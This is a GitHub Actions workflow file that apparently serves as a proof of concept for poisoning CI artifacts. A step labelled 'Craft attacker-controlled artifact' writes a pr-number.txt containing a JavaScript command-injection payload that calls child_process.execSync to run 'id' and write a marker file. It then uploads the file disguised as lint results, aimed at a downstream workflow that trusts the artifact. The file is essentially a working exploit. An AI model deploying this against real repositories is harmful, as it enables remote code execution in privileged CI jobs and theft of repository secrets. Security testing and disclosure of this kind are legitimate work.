---
name: PR Validation
on:
  pull_request:

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled artifact
        run: |
          echo "true" > has-warnings.txt
          printf '%s\n' "999999; require('child_process').execSync('id; echo INJECTED_RCE_PROOF > /tmp/gab-prcomment-marker').toString(); 999999" > pr-number.txt
          cat pr-number.txt
      - name: Upload lint results
        uses: actions/upload-artifact@v4
        with:
          name: lint-results
          path: |
            has-warnings.txt
            pr-number.txt
